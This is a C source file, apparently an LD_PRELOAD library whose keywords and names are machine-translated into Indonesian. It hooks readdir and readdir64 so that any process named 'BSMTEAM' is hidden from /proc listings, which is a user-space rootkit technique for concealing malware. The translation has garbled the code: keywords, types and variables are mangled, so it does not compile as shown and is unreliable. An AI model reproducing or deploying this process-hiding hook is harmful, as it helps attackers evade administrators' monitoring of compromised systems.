#tentukan _GNU_SOURCE

#termasuk <stdio.h>
#termasuk <dlfcn.h>
#termasuk <dirent.h>
#termasuk <string.h>
#termasuk <unistd.h>

/*
 * Setiap proses dengan nama ini akan dikecualikan
 */
static const char* process_to_filter = "BSMTEAM";

/*
 * Dapatkan nama direktori yang diberi pegangan DIR*
 */
static int get_dir_name(python* dirp, char* buf, ukuran_t ukuran)
{
    int fd = dirfd(dirp);
    jika(fd == -1) {
        kembali 0;
    }

    karakter tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, ukuran);
    jika(kembali == -1) {
        kembali 0;
    }

    buf[mundur] = 0;
    kembali 1;
}

/*
 * Dapatkan nama proses berdasarkan pidnya
 */
int statis get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        kembali 0;
    }

    karakter tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    jika(f == BATAL) {
        kembali 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        tutup(f);
        kembali 0;
    }

    tutup(f);

    int tidak digunakan;
    sscanf(tmp, "%d (%[^)]s", &tidak digunakan, buf);
    kembali 1;
}

#define DECLARE_READDIR(dirent, readdir) \
struct statis dirent* (*asli_##readdir)(python*) = NULL; \
                                                                        \
struct dirent* readdir(DIR *dirp) \
{\
    jika(asli_##readdir == NULL) { \
        asli_##readdir = dlsym(RTLD_NEXT, #readdir); \
        jika(asli_##readdir == NULL) \
        {\
            fprintf(stderr, "Kesalahan pada dlsym: %s\n", dlerror()); \
        } \
    } \
                                                                        \
    struct dirent* dir; \
                                                                        \
    sementara(1) \
    {\
        dir = asli_##readdir(dirp); \
        jika(dir) { \
            char dir_name[256]; \
            karakter nama_proses[256]; \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                strcmp(dir_name, "/proc") == 0 && \
                get_process_name(dir->d_name, proses_name) && \
                strcmp(nama_proses, proses_ke_filter) == 0) { \
                melanjutkan; \
            } \
        } \
        merusak; \
    } \
    kembalikan direktori; \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(langsung, readdir);
